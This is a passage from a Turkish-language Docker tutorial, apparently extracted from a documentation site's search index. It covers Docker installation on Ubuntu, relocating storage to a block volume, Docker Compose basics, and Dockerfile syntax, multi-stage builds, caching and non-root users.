\u00c7at\u0131\u015fmas\u0131: Docker, container'lar\u0131 d\u0131\u015far\u0131 a\u00e7arken (binding ports) <code>iptables</code> kurallar\u0131n\u0131 do\u011frudan de\u011fi\u015ftirir ve UFW'yi BYPASS EDER. Yani <code>ufw status</code> \u00e7\u0131kt\u0131s\u0131nda port kapal\u0131 g\u00f6r\u00fcnse bile, Docker container'\u0131n\u0131z t\u00fcm d\u00fcnyaya a\u00e7\u0131k olabilir! \u00c7\u00f6z\u00fcm: Bu rehberin ilerleyen k\u0131s\u0131mlar\u0131nda veya Firewall Rehberi'nde bahsedilen <code>ufw-docker</code> arac\u0131n\u0131 mutlaka kullan\u0131n.</p>"},{"location":"how-to/docker/#12-eski-surumleri-temizle","title":"1.2. Eski S\u00fcr\u00fcmleri Temizle \ud83e\uddf9","text":"<p>Sistemde kurulu (Ubuntu ile gelen) eski veya \u00e7ak\u0131\u015fan paketler varsa temizleyelim:</p> <pre><code>sudo apt remove docker.io docker-compose docker-compose-v2 docker-doc podman-docker containerd runc\n# \"Package not found\" derse sorun yok, devam edin.\n</code></pre>"},{"location":"how-to/docker/#13-docker-deposunu-repository-ekleme","title":"1.3. Docker Deposunu (Repository) Ekleme","text":"<ol> <li> <p>Gerekli sertifika ara\u00e7lar\u0131n\u0131 kurun:</p> <pre><code>sudo apt update\nsudo apt install -y ca-certificates curl\n</code></pre> </li> <li> <p>Docker'\u0131n resmi GPG anahtar\u0131n\u0131 indirin ve g\u00fcvenli klas\u00f6re kaydedin:</p> <pre><code>sudo install -m 0755 -d /etc/apt/keyrings\nsudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc\nsudo chmod a+r /etc/apt/keyrings/docker.asc\n</code></pre> </li> <li> <p>Depoyu kaynak listenize (<code>sources.list</code>) ekleyin:</p> <pre><code>echo \\\n  \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \\\n  $(. /etc/os-release &amp;&amp; echo \"$VERSION_CODENAME\") stable\" | \\\n  sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\n</code></pre> </li> <li> <p>Paket listesini g\u00fcncelleyin:     <pre><code>sudo apt update\n</code></pre></p> </li> </ol>"},{"location":"how-to/docker/#14-docker-engine-kurulumu","title":"1.4. Docker Engine Kurulumu \ud83d\udce6","text":"<p>Art\u0131k en g\u00fcncel s\u00fcr\u00fcm\u00fc kurabiliriz:</p> <pre><code>sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin\n</code></pre> <p>[!NOTE] Eski <code>docker-compose</code> (Python tabanl\u0131) yerine art\u0131k <code>docker-compose-plugin</code> (Go tabanl\u0131, <code>docker compose</code> komutu) kullan\u0131yoruz.</p>"},{"location":"how-to/docker/#15-dogrulama-test","title":"1.5. Do\u011frulama (Test) \ud83e\uddea","text":"<p>Her \u015feyin do\u011fru kuruldu\u011funu basit bir imaj \u00e7al\u0131\u015ft\u0131rarak g\u00f6relim:</p> <pre><code>sudo docker run hello-world\n</code></pre> <p>(Ekrana \"Hello from Docker!\" yazan bir mesaj geldiyse kurulum ba\u015far\u0131l\u0131d\u0131r.)</p>"},{"location":"how-to/docker/#16-sudosuz-kullanm-opsiyonel-ama-onerilen","title":"1.6. Sudo'suz Kullan\u0131m (Opsiyonel ama \u00d6nerilen)","text":"<p>Her komutun ba\u015f\u0131na <code>sudo</code> yazmak yorucudur. Mevcut kullan\u0131c\u0131n\u0131z\u0131 <code>docker</code> grubuna ekleyin:</p> <pre><code>sudo usermod -aG docker $USER\nnewgrp docker\n</code></pre> <p>Art\u0131k <code>sudo</code> olmadan deneyin:</p> <pre><code>docker version\n</code></pre>"},{"location":"how-to/docker/#2-docker-storage-kritik","title":"2. Docker Storage (Kritik)","text":"<p>Varsay\u0131lan olarak Docker, t\u00fcm imajlar\u0131 ve volume'leri <code>/var/lib/docker</code> alt\u0131nda tutar. Bu klas\u00f6r \"Boot Volume\" \u00fczerindedir. E\u011fer bu disk dolarsa sunucu \u00e7\u00f6ker. E\u011fer sunucu bozulursa verileriniz gider.</p> <p>Bu y\u00fczden Docker verilerini harici Block Volume'e ta\u015f\u0131mal\u0131y\u0131z.</p> <p>[!IMPORTANT] \u00d6nce Oracle Block Volume rehberindeki ad\u0131mlar\u0131 tamamlay\u0131p diski <code>/mnt/blockvolume</code> alt\u0131na mount etti\u011finizden emin olun.</p>"},{"location":"how-to/docker/#data-root-degistirme-admlar","title":"Data Root De\u011fi\u015ftirme Ad\u0131mlar\u0131","text":"<ol> <li> <p>Klas\u00f6r\u00fc Haz\u0131rla:</p> <pre><code># Harici diskte docker i\u00e7in bir klas\u00f6r a\u00e7\nsudo mkdir -p /mnt/blockvolume/docker-data\n</code></pre> </li> <li> <p>Konfig\u00fcrasyon Dosyas\u0131n\u0131 D\u00fczenle: <code>/etc/docker/daemon.json</code> dosyas\u0131n\u0131 olu\u015fturun veya d\u00fczenleyin:</p> <pre><code>sudo nano /etc/docker/daemon.json\n</code></pre> <p>\u0130\u00e7eri\u011fi \u015fu \u015fekilde olmal\u0131d\u0131r:</p> <pre><code>{\n  \"data-root\": \"/mnt/blockvolume/docker-data\",\n  \"log-driver\": \"json-file\",\n  \"log-opts\": {\n    \"max-size\": \"10m\",\n    \"max-file\": \"3\"\n  }\n}\n</code></pre> <p>(Not: Log ayarlar\u0131n\u0131 da ekledik ki loglar diski doldurmas\u0131n)</p> </li> <li> <p>Docker'\u0131 Yeniden Ba\u015flat:</p> <pre><code>sudo systemctl daemon-reload\nsudo systemctl restart docker\n</code></pre> </li> <li> <p>Do\u011frulama: <pre><code>docker info | grep \"Docker Root Dir\"\n</code></pre>     \u00c7\u0131kt\u0131da <code>/mnt/blockvolume/docker-data</code> g\u00f6r\u00fcyorsan\u0131z i\u015flem ba\u015far\u0131l\u0131d\u0131r! \ud83c\udf89</p> </li> </ol>"},{"location":"how-to/docker/#3-temel-komutlar","title":"3. Temel Komutlar","text":"<pre><code># Arkaplanda \u00e7al\u0131\u015ft\u0131r\ndocker compose up -d\n\n# Loglar\u0131 izle\ndocker compose logs -f\n\n# T\u00fcm sistemi temizle (Kullan\u0131lmayan imajlar, containerlar)\ndocker system prune -a\n</code></pre>"},{"location":"how-to/docker/#4-docker-compose-mantg-neden-kullanyoruz","title":"4. Docker Compose Mant\u0131\u011f\u0131 (Neden Kullan\u0131yoruz?)","text":"<p>E\u011fer Docker'\u0131 \"elle\" (<code>docker run ...</code>) kullan\u0131yorsan\u0131z, muhtemelen \u015f\u00f6yle uzun komutlar yaz\u0131yorsunuzdur:</p> <pre><code>docker run -d --name web -p 80:80 -v ./html:/usr/share/nginx/html --restart always nginx:alpine\n</code></pre> <p>Bu y\u00f6ntem yorucudur ve hataya a\u00e7\u0131kt\u0131r. Yar\u0131n bu komutu hat\u0131rlayabilecek misiniz? Muhtemelen hay\u0131r.</p>"},{"location":"how-to/docker/#compose-sizin-manifestonuzdur","title":"Compose: Sizin \"Manifesto\"nuzdur \ud83d\udcdc","text":"<p>Docker Compose, \"Benim sunucumda ne \u00e7al\u0131\u015fmal\u0131?\" sorusunun yaz\u0131l\u0131 cevab\u0131d\u0131r (<code>docker-compose.yml</code>).</p> <p>Analoji:</p> <ul> <li>Docker Run: Garsona s\u00f6zl\u00fc olarak \"Bana hamburger getir, so\u011fans\u0131z olsun, yan\u0131nda kola olsun, buzlu olsun...\" demek gibidir.</li> <li>Docker Compose: Masaya \"Men\u00fc\"y\u00fc b\u0131rak\u0131p \"Bunu getir\" (<code>docker compose up -d</code>) demek gibidir. Mutfak ne yapaca\u011f\u0131n\u0131 zaten men\u00fcden okur.</li> </ul>"},{"location":"how-to/docker/#dockerfile-vs-docker-compose-fark-nedir","title":"Dockerfile vs Docker Compose: Fark Nedir?","text":"<p>Bu ikisi kar\u0131\u015ft\u0131r\u0131l\u0131r ama g\u00f6revleri farkl\u0131d\u0131r:</p> <ol> <li>Dockerfile (Tarif): \"Bu yeme\u011fin i\u00e7inde ne var?\"<ul> <li>Ubuntu \u00fczerine Python kur, kodlar\u0131m\u0131 kopyala, k\u00fct\u00fcphaneleri y\u00fckle.</li> <li>Sonu\u00e7: Bir Image (Kal\u0131p) \u00e7\u0131kar.</li> </ul> </li> <li>Docker Compose (Servis): \"Bu yemek nas\u0131l servis edilecek?\"<ul> <li>Olu\u015fan Image'\u0131 al, 80 portunu a\u00e7, \u015fu veritaban\u0131na ba\u011fla, \u015fu diski kullan.</li> <li>Sonu\u00e7: \u00c7al\u0131\u015fan bir Container \u00e7\u0131kar.</li> </ul> </li> </ol>"},{"location":"how-to/docker/#soru-compose-dockerfile-nasl-kullanr-image-vs-build","title":"Soru: Compose, Dockerfile'\u0131 Nas\u0131l Kullan\u0131r? (<code>image</code> vs <code>build</code>)","text":"<p>Compose dosyas\u0131nda iki y\u00f6ntem kullanabilirsiniz:</p> <p>Y\u00f6ntem 1: Haz\u0131r Kullan (Image) \u0130nternetten (Docker Hub) haz\u0131r paket indirir.</p> <pre><code>services:\n  web:\n    image: nginx:latest # Haz\u0131r indir\n    ports:\n      - \"80:80\"\n</code></pre> <p>Y\u00f6ntem 2: Kendin Pi\u015fir (Build) \ud83d\udc68\u200d\ud83c\udf73 Sizin sordu\u011funuz senaryo budur. <code>build: .</code> dedi\u011finizde Compose \u015funlar\u0131 yapar:</p> <ol> <li>Klas\u00f6rdeki <code>Dockerfile</code>'\u0131 okur.</li> <li>Ondan bir Image olu\u015fturur (Build eder).</li> <li>Sonra o Image'\u0131 \u00e7al\u0131\u015ft\u0131r\u0131r.</li> </ol> <pre><code>services:\n  api:\n    build: . # Buradaki Dockerfile'a bak ve build et!\n    ports:\n      - \"5000:5000\"\n    volumes:\n      - .:/app\n</code></pre> <p>B\u00f6ylece <code>docker build ...</code> komutuyla u\u011fra\u015fmadan, tek bir <code>docker compose up -d --build</code> komutuyla hem kodunuzu derler hem sunucuyu aya\u011fa kald\u0131r\u0131rs\u0131n\u0131z.</p>"},{"location":"how-to/dockerfile-doc/","title":"Dockerfile Yazma Rehberi","text":"<p>Dockerfile, Docker image'lar\u0131n\u0131z\u0131 olu\u015fturmak i\u00e7in kulland\u0131\u011f\u0131n\u0131z \"tarif\" dosyas\u0131d\u0131r. Bu rehber, temel syntax'tan production-grade optimizasyonlara kadar her \u015feyi kapsar.</p>"},{"location":"how-to/dockerfile-doc/#1-dockerfile-nedir","title":"1. Dockerfile Nedir? \ud83e\udd14","text":"<p>Analoji: Dockerfile, bir yeme\u011fin tarifine benzer:</p> <ul> <li>Malzemeler: Base image, paketler, ba\u011f\u0131ml\u0131l\u0131klar</li> <li>Ad\u0131mlar: RUN, COPY, ADD komutlar\u0131</li> <li>Sunum: CMD, ENTRYPOINT ile nas\u0131l \u00e7al\u0131\u015faca\u011f\u0131</li> </ul> <p>Sonu\u00e7: Bir Docker Image (kal\u0131p) elde edersiniz. Bu image'dan istedi\u011finiz kadar Container (\u00e7al\u0131\u015fan \u00f6rnek) olu\u015fturabilirsiniz.</p>"},{"location":"how-to/dockerfile-doc/#2-temel-syntax-ve-komutlar","title":"2. Temel Syntax ve Komutlar \ud83d\udcdd","text":""},{"location":"how-to/dockerfile-doc/#21-from-base-image-secimi","title":"2.1. FROM - Base Image Se\u00e7imi","text":"<p>Her Dockerfile bir base image ile ba\u015flar:</p> <pre><code># Resmi Node.js image'\u0131\nFROM node:20-alpine\n\n# Resmi Python image'\u0131\nFROM python:3.12-slim\n\n# Ubuntu base\nFROM ubuntu:22.04\n\n# Scratch (bo\u015f image - sadece binary i\u00e7in)\nFROM scratch\n</code></pre> <p>Alpine vs Slim vs Full:</p> <ul> <li><code>alpine</code>: En k\u00fc\u00e7\u00fck (~5MB), minimal paketler</li> <li><code>slim</code>: Orta boyut (~50MB), temel ara\u00e7lar var</li> <li><code>latest</code> (full): En b\u00fcy\u00fck (~200MB+), t\u00fcm ara\u00e7lar</li> </ul> <p>[!TIP] Production i\u00e7in alpine veya slim tercih edin. Daha k\u00fc\u00e7\u00fck image = daha h\u0131zl\u0131 deploy.</p>"},{"location":"how-to/dockerfile-doc/#22-workdir-calsma-dizini","title":"2.2. WORKDIR - \u00c7al\u0131\u015fma Dizini","text":"<pre><code>FROM node:20-alpine\n\n# Bundan sonraki t\u00fcm komutlar /app i\u00e7inde \u00e7al\u0131\u015f\u0131r\nWORKDIR /app\n\n# Art\u0131k /app i\u00e7indeyiz\nCOPY package.json .\nRUN npm install\n</code></pre> <p>Neden WORKDIR?</p> <ul> <li><code>cd /app</code> yerine kullan\u0131l\u0131r</li> <li>Her RUN'da tekrar <code>cd</code> yapmaya gerek kalmaz</li> <li>Daha temiz ve okunabilir</li> </ul>"},{"location":"how-to/dockerfile-doc/#23-copy-vs-add","title":"2.3. COPY vs ADD","text":"<p>COPY (\u00d6nerilen):</p> <pre><code># Host'taki dosyay\u0131 container'a kopyala\nCOPY package.json /app/\nCOPY src/ /app/src/\n\n# T\u00fcm dosyalar\u0131 kopyala\nCOPY . .\n</code></pre> <p>ADD (\u00d6zel Durumlar):</p> <pre><code># URL'den dosya indir\nADD https://example.com/file.tar.gz /tmp/\n\n# .tar.gz dosyas\u0131n\u0131 otomatik extract et\nADD archive.tar.gz /app/\n</code></pre> <p>[!WARNING] Genelde COPY kullan\u0131n. ADD sadece URL veya auto-extract gerekti\u011finde.</p>"},{"location":"how-to/dockerfile-doc/#24-run-komut-calstrma","title":"2.4. RUN - Komut \u00c7al\u0131\u015ft\u0131rma","text":"<pre><code># Shell form (sh -c ile \u00e7al\u0131\u015f\u0131r)\nRUN apt-get update &amp;&amp; apt-get install -y curl\n\n# Exec form (do\u011frudan \u00e7al\u0131\u015f\u0131r, \u00f6nerilen)\nRUN [\"apt-get\", \"update\"]\nRUN [\"apt-get\", \"install\", \"-y\", \"curl\"]\n</code></pre> <p>Best Practice: Komutlar\u0131 Birle\u015ftir</p> <pre><code># \u274c K\u00f6t\u00fc (3 layer olu\u015fturur)\nRUN apt-get update\nRUN apt-get install -y curl\nRUN apt-get clean\n\n# \u2705 \u0130yi (1 layer olu\u015fturur)\nRUN apt-get update &amp;&amp; \\\n    apt-get install -y curl &amp;&amp; \\\n    apt-get clean &amp;&amp; \\\n    rm -rf /var/lib/apt/lists/*\n</code></pre>"},{"location":"how-to/dockerfile-doc/#25-env-environment-variables","title":"2.5. ENV - Environment Variables","text":"<pre><code># Build ve runtime'da kullan\u0131l\u0131r\nENV NODE_ENV=production\nENV PORT=3000\nENV APP_HOME=/app\n\n# Kullan\u0131m\u0131\nWORKDIR $APP_HOME\n</code></pre>"},{"location":"how-to/dockerfile-doc/#26-arg-build-time-variables","title":"2.6. ARG - Build-Time Variables","text":"<pre><code># Sadece build s\u0131ras\u0131nda kullan\u0131l\u0131r\nARG NODE_VERSION=20\nFROM node:${NODE_VERSION}-alpine\n\nARG BUILD_DATE\nARG GIT_COMMIT\nLABEL build_date=$BUILD_DATE\nLABEL git_commit=$GIT_COMMIT\n</code></pre> <p>Build s\u0131ras\u0131nda de\u011fer ge\u00e7irme:</p> <pre><code>docker build --build-arg NODE_VERSION=18 --build-arg BUILD_DATE=$(date -u +\"%Y-%m-%dT%H:%M:%SZ\") .\n</code></pre> <p>ARG vs ENV:</p> <ul> <li>ARG: Sadece build s\u0131ras\u0131nda, image'a g\u00f6m\u00fclmez</li> <li>ENV: Build + runtime, image'a g\u00f6m\u00fcl\u00fcr</li> </ul>"},{"location":"how-to/dockerfile-doc/#27-expose-port-bildirimi","title":"2.7. EXPOSE - Port Bildirimi","text":"<pre><code># Bu port'un kullan\u0131laca\u011f\u0131n\u0131 bildir (dok\u00fcmantasyon ama\u00e7l\u0131)\nEXPOSE 3000\nEXPOSE 8080\n</code></pre> <p>[!NOTE] <code>EXPOSE</code> port'u a\u00e7maz, sadece bildirir. Ger\u00e7ek port mapping <code>docker run -p</code> ile yap\u0131l\u0131r.</p>"},{"location":"how-to/dockerfile-doc/#28-cmd-vs-entrypoint","title":"2.8. CMD vs ENTRYPOINT","text":"<p>CMD (Varsay\u0131lan Komut):</p> <pre><code># Shell form\nCMD npm start\n\n# Exec form (\u00f6nerilen)\nCMD [\"npm\", \"start\"]\n\n# Parametreler\nCMD [\"node\", \"server.js\"]\n</code></pre> <p>ENTRYPOINT (Sabit Komut):</p> <pre><code>ENTRYPOINT [\"node\"]\nCMD [\"server.js\"]\n\n# docker run myimage           -&gt; node server.js\n# docker run myimage app.js    -&gt; node app.js\n</code></pre> <p>Fark:</p> <ul> <li>CMD: <code>docker run</code> ile override edilebilir</li> <li>ENTRYPOINT: Sabit kal\u0131r, CMD parametreleri de\u011fi\u015fir</li> </ul> <p>Best Practice:</p> <pre><code># ENTRYPOINT: Ana komut\nENTRYPOINT [\"python\"]\n\n# CMD: Varsay\u0131lan parametreler\nCMD [\"app.py\"]\n</code></pre>"},{"location":"how-to/dockerfile-doc/#29-user-non-root-user","title":"2.9. USER - Non-Root User","text":"<p>Alpine Linux (node:20-alpine):</p> <pre><code># G\u00fcvenlik i\u00e7in non-root user olu\u015ftur (Alpine syntax)\nRUN addgroup -g 1001 -S nodejs &amp;&amp; \\\n    adduser -S nodejs -u 1001\n\n# Bu kullan\u0131c\u0131ya ge\u00e7\nUSER nodejs\n\n# Bundan sonraki komutlar nodejs kullan\u0131c\u0131s\u0131 ile \u00e7al\u0131\u015f\u0131r\nCMD [\"node\", \"server.js\"]\n</code></pre> <p>Debian/Ubuntu (node:20, ubuntu:22.04):</p> <pre><code># Debian/Ubuntu i\u00e7in farkl\u0131 syntax gerekir\nRUN groupadd -g 1001 nodejs &amp;&amp; \\\n    useradd -r -u 1001 -g nodejs nodejs\n\nUSER nodejs\nCMD [\"node\", \"server.js\"]\n</code></pre> <p>[!WARNING] Kritik: <code>addgroup</code>/<code>adduser</code> komutlar\u0131 sadece Alpine'da \u00e7al\u0131\u015f\u0131r. Debian/Ubuntu base image kullan\u0131yorsan\u0131z <code>groupadd</code>/<code>useradd</code> kullanmal\u0131s\u0131n\u0131z, aksi halde build fail olur!</p>"},{"location":"how-to/dockerfile-doc/#210-volume-veri-saklama","title":"2.10. VOLUME - Veri Saklama","text":"<pre><code># Volume mount point tan\u0131mla\nVOLUME [\"/data\"]\nVOLUME [\"/var/log\"]\n</code></pre> <p>[!NOTE] <code>WORKDIR</code> komutu dizin yoksa otomatik olu\u015fturur. <code>RUN mkdir -p /app</code> yapmaya gerek yok!</p>"},{"location":"how-to/dockerfile-doc/#211-label-metadata-ekleme","title":"2.11. LABEL - Metadata Ekleme","text":"<pre><code># OCI standart labels (\u00f6nerilen)\nLABEL org.opencontainers.image.title=\"My App\" \\\n      org.opencontainers.image.description=\"Production application\" \\\n      org.opencontainers.image.version=\"1.0.0\" \\\n      org.opencontainers.image.vendor=\"My Company\" \\\n      org.opencontainers.image.source=\"https://github.com/user/repo\" \\\n      org.opencontainers.image.created=\"2024-01-15T10:00:00Z\"\n\n# \u00d6zel labels\nLABEL maintainer=\"devops@company.com\" \\\n      environment=\"production\"\n</code></pre>"},{"location":"how-to/dockerfile-doc/#212-shell-default-shell-degistirme","title":"2.12. SHELL - Default Shell De\u011fi\u015ftirme","text":"<pre><code># Default shell'i bash yap\nSHELL [\"/bin/bash\", \"-c\"]\n\n# Art\u0131k RUN komutlar\u0131 bash ile \u00e7al\u0131\u015f\u0131r\nRUN echo \"Hello from bash\"\n\n# PowerShell i\u00e7in (Windows containers)\nSHELL [\"powershell\", \"-Command\"]\n</code></pre>"},{"location":"how-to/dockerfile-doc/#213-stopsignal-graceful-shutdown","title":"2.13. STOPSIGNAL - Graceful Shutdown","text":"<pre><code># Container durdurulurken g\u00f6nderilecek sinyal\nSTOPSIGNAL SIGTERM  # Default\n\n# Baz\u0131 uygulamalar farkl\u0131 sinyal bekler\nSTOPSIGNAL SIGQUIT  # Nginx i\u00e7in\n</code></pre>"},{"location":"how-to/dockerfile-doc/#214-healthcheck-saglk-kontrolu","title":"2.14. HEALTHCHECK - Sa\u011fl\u0131k Kontrol\u00fc","text":"<p>Node.js (Alpine):</p> <pre><code># \u2705 Built-in Node.js ile (harici ba\u011f\u0131ml\u0131l\u0131k yok)\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n  CMD node -e \"require('http').get('http://localhost:3000/health', (r) =&gt; process.exit(r.statusCode === 200 ? 0 : 1))\"\n\n# \u2705 wget ile (Alpine'da varsay\u0131lan)\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n  CMD wget --no-verbose --tries=1 --spider http://localhost:3000/health || exit 1\n</code></pre> <p>Python:</p> <pre><code># \u2705 Built-in urllib ile (requests gerektirmez)\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n  CMD python -c \"import urllib.request; urllib.request.urlopen('http://localhost:8000/health')\" || exit 1\n</code></pre> <p>[!WARNING] Alpine'da curl yok! <code>curl</code> kullanmak istiyorsan\u0131z: <code>RUN apk add --no-cache curl</code></p> <p>Python'da requests yok! <code>import requests</code> i\u00e7in <code>requirements.txt</code>'de olmal\u0131. Built-in <code>urllib.request</code> tercih edin</p> <pre><code>---\n\n## 3. Multi-Stage Builds \ud83c\udfd7\ufe0f\n\nMulti-stage builds, image boyutunu k\u00fc\u00e7\u00fcltmek i\u00e7in **en \u00f6nemli** tekniktir.\n\n### 3.1. Temel \u00d6rnek (Node.js)\n\n```dockerfile\n# ===== STAGE 1: Builder =====\nFROM node:20-alpine AS builder\n\nWORKDIR /app\n\n# Dependencies'i kopyala ve y\u00fckle\nCOPY package*.json ./\nRUN npm ci --omit=dev  # npm 7+ i\u00e7in (--only=production deprecated)\n\n# Kaynak kodlar\u0131 kopyala ve build et\nCOPY . .\nRUN npm run build\n\n# ===== STAGE 2: Production =====\nFROM node:20-alpine AS production\n\nWORKDIR /app\n\n# Sadece gerekli dosyalar\u0131 \u00f6nceki stage'den al\nCOPY --from=builder /app/dist ./dist\nCOPY --from=builder /app/node_modules ./node_modules\nCOPY package.json ./\n\n# Non-root user\nRUN addgroup -g 1001 -S nodejs &amp;&amp; \\\n    adduser -S nodejs -u 1001\nUSER nodejs\n\nEXPOSE 3000\n\nCMD [\"node\", \"dist/index.js\"]\n</code></pre> <p>Sonu\u00e7:</p> <ul> <li>Builder stage: 500MB (dev dependencies, source code)</li> <li>Production stage: 150MB (sadece gerekli dosyalar)</li> </ul>"},{"location":"how-to/dockerfile-doc/#32-ileri-seviye-ornek-go","title":"3.2. \u0130leri Seviye \u00d6rnek (Go)","text":"<pre><code># ===== STAGE 1: Builder =====\nFROM golang:1.21-alpine AS builder\n\nWORKDIR /app\n\n# Go modules\nCOPY go.mod go.sum ./\nRUN go mod download\n\n# Build\nCOPY . .\nRUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o main .\n\n# ===== STAGE 2: Production =====\nFROM scratch\n\n# CA certificates (HTTPS i\u00e7in gerekli)\nCOPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/\n\n# Binary'yi kopyala\nCOPY --from=builder /app/main /main\n\nEXPOSE 8080\n\nENTRYPOINT [\"/main\"]\n</code></pre> <p>Sonu\u00e7:</p> <ul> <li>Builder stage: 400MB</li> <li>Production stage: 5MB (sadece binary!)</li> </ul>"},{"location":"how-to/dockerfile-doc/#33-python-ornegi","title":"3.3. Python \u00d6rne\u011fi","text":"<pre><code># ===== STAGE 1: Builder =====\nFROM python:3.12-slim AS builder\n\nWORKDIR /app\n\n# Virtual environment olu\u015ftur\nRUN python -m venv /opt/venv\nENV PATH=\"/opt/venv/bin:$PATH\"\n\n# Dependencies\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n\n# ===== STAGE 2: Production =====\nFROM python:3.12-slim AS production\n\nWORKDIR /app\n\n# Virtual environment'\u0131 kopyala\nCOPY --from=builder /opt/venv /opt/venv\nENV PATH=\"/opt/venv/bin:$PATH\"\n\n# Uygulama kodlar\u0131\nCOPY . .\n\n# Non-root user\nRUN useradd -m -u 1001 appuser\nUSER appuser\n\nEXPOSE 8000\n\nCMD [\"gunicorn\", \"app:app\", \"--bind\", \"0.0.0.0:8000\"]\n</code></pre>"},{"location":"how-to/dockerfile-doc/#34-net-ornegi","title":"3.4. .NET \u00d6rne\u011fi","text":"<pre><code># ===== STAGE 1: Build =====\nFROM mcr.microsoft.com/dotnet/sdk:8.0 AS build\n\nWORKDIR /src\n\n# Restore dependencies\nCOPY [\"MyApp.csproj\", \"./\"]\nRUN dotnet restore\n\n# Build\nCOPY . .\nRUN dotnet build -c Release -o /app/build\n\n# ===== STAGE 2: Publish =====\nFROM build AS publish\nRUN dotnet publish -c Release -o /app/publish\n\n# ===== STAGE 3: Runtime =====\nFROM mcr.microsoft.com/dotnet/aspnet:8.0-alpine AS runtime\n\nWORKDIR /app\n\n# Non-root user\nRUN addgroup -g 1001 -S dotnet &amp;&amp; \\\n    adduser -S dotnet -u 1001\nUSER dotnet\n\nCOPY --from=publish /app/publish .\n\nEXPOSE 5000\n\nENTRYPOINT [\"dotnet\", \"MyApp.dll\"]\n</code></pre>"},{"location":"how-to/dockerfile-doc/#4-dockerignore-gereksiz-dosyalar-haric-tutma","title":"4. .dockerignore - Gereksiz Dosyalar\u0131 Hari\u00e7 Tutma \ud83d\udeab","text":"<p><code>.dockerignore</code> dosyas\u0131, <code>.gitignore</code> gibi \u00e7al\u0131\u015f\u0131r. Build context'e dahil edilmeyecek dosyalar\u0131 belirtir.</p> <pre><code># Node.js\nnode_modules/\nnpm-debug.log\n.npm\ncoverage/\n.nyc_output/\n\n# Python\n__pycache__/\n*.pyc\n*.pyo\n*.pyd\n.Python\nvenv/\n.venv/\n.pytest_cache/\nhtmlcov/\n\n# Git\n.git/\n.gitignore\n.gitattributes\n\n# IDE\n.vscode/\n.idea/\n*.swp\n*.swo\n.DS_Store\n\n# OS\n.DS_Store\nThumbs.db\n\n# Build artifacts\ndist/\nbuild/\n*.log\n\n# Environment files (ama .env.example hari\u00e7!)\n*.env*\n!.env.example\n\n# Documentation\nREADME.md\ndocs/\n*.md\nLICENSE\nCHANGELOG.md\n\n# Tests\ntests/\n__tests__/\n*.test.js\n*.spec.js\n*.test.py\n*.spec.py\n\n# CI/CD\n.github/\n.gitlab-ci.yml\nDockerfile\ndocker-compose.yml\n.dockerignore\nMakefile\n</code></pre> <p>Neden \u00d6nemli?</p> <ul> <li>Build h\u0131z\u0131n\u0131 art\u0131r\u0131r</li> <li>Image boyutunu k\u00fc\u00e7\u00fclt\u00fcr</li> <li>G\u00fcvenlik (secrets build context'e girmez)</li> </ul>"},{"location":"how-to/dockerfile-doc/#5-layer-caching-ve-optimizasyon","title":"5. Layer Caching ve Optimizasyon \ud83d\ude80","text":"<p>Docker, her komutu bir layer olarak saklar. Layer'lar cache'lenir, de\u011fi\u015fmeyen layer'lar tekrar build edilmez.</p>"},{"location":"how-to/dockerfile-doc/#51-cache-friendly-sralama","title":"5.1. Cache-Friendly S\u0131ralama","text":"<p>\u274c K\u00f6t\u00fc (Her kod de\u011fi\u015fikli\u011finde npm install \u00e7al\u0131\u015f\u0131r):</p> <pre><code>FROM node:20-alpine\nWORKDIR /app\nCOPY . .\nRUN npm install\nCMD [\"npm\", \"start\"]\n</code></pre> <p>\u2705 \u0130yi (package.json de\u011fi\u015fmedik\u00e7e npm install cache'den gelir):</p> <pre><code>FROM node:20-alpine\nWORKDIR /app\n\n# \u00d6nce dependencies (az de\u011fi\u015fir)\nCOPY package*.json ./\nRUN npm ci\n\n# Sonra kod (s\u0131k de\u011fi\u015fir)\nCOPY . .\n\nCMD [\"npm\", \"start\"]\n</code></pre>"},{"location":"how-to/dockerfile-doc/#52-komutlar-birlestir","title":"5.2. Komutlar\u0131 Birle\u015ftir","text":"<p>\u274c K\u00f6t\u00fc (3 layer):</p> <pre><code>RUN apt-get update\nRUN apt-get install -y curl\nRUN apt-get clean\n</code></pre> <p>\u2705 \u0130yi (1 layer):</p> <pre><code>RUN apt-get update &amp;&amp; \\\n    apt-get install -y curl &amp;&amp; \\\n    apt-get clean &amp;&amp; \\\n    rm -rf /var/lib/apt/lists/*\n</code></pre>"},{"location":"how-to/dockerfile-doc/#53-buildkit-cache-mounts","title":"5.3. BuildKit Cache Mounts","text":"<pre><code># syntax=docker/dockerfile:1\n\nFROM node:20-alpine\n\nWORKDIR /app\n\nCOPY package*.json ./\n\n# npm cache'i mount et (her build'de indirilmez)\nRUN --mount=type=cache,target=/root/.npm \\\n    npm ci\n\nCOPY . .\n\nCMD [\"npm\", \"start\"]\n</code></pre> <p>[!IMPORTANT] BuildKit Syntax Directive Zorunlu: <code>--mount=type=cache</code> ve <code>--mount=type=secret</code> kullanmak i\u00e7in Dockerfile'\u0131n ilk sat\u0131r\u0131nda mutlaka <code># syntax=docker/dockerfile:1</code> olmal\u0131d\u0131r. Bu sat\u0131r yoksa build hata verir!</p> <p>Build:</p> <pre><code># BuildKit otomatik aktif (Docker 23.0+)\ndocker build -t myapp .\n\n# Eski versiyonlarda manuel aktif etme\nDOCKER_BUILDKIT=1 docker build -t myapp .\n</code></pre>"},{"location":"how-to/dockerfile-doc/#6-guvenlik-best-practices","title":"6. G\u00fcvenlik Best Practices \ud83d\udd12","text":""},{"location":"how-to/dockerfile-doc/#61-non-root-user-kritik","title":"6.1. Non-Root User (Kritik!)","text":"<pre><code>FROM node:20-alpine\n\nWORKDIR /app\n\n# Dependencies\nCOPY package*.json ./\nRUN npm ci\n\n# Kod\nCOPY . .\n\n# Non-root user olu\u015ftur\nRUN addgroup -g 1001 -S nodejs &amp;&amp; \\\n    adduser -S nodejs -u 1001\n\n# 